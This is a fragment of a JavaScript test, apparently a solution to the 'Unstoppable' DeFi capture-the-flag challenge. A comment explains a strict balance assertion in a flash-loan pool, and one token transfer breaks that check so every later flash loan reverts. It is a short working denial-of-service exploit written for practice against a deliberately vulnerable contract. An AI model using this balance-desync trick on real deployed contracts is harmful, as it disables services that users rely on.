...
describe("[Challenge] Unstoppable", function () {
  ...
  it("Exploit", async function () {
    /*
        VULNERABILITY in --> assert(poolBalance == balanceBefore)
        poolBalance is only updated on depositTokens functions
        
        Sending some tokens to the pool will cause the flashLoan function not to assert, thus rever the flashLoan transaction
    */
    await this.token.connect(attacker).transfer(this.pool.address, ethers.utils.parseEther("1"));

    expect(await this.token.balanceOf(attacker.address)).to.be.equal(ethers.utils.parseEther("99"));
  });
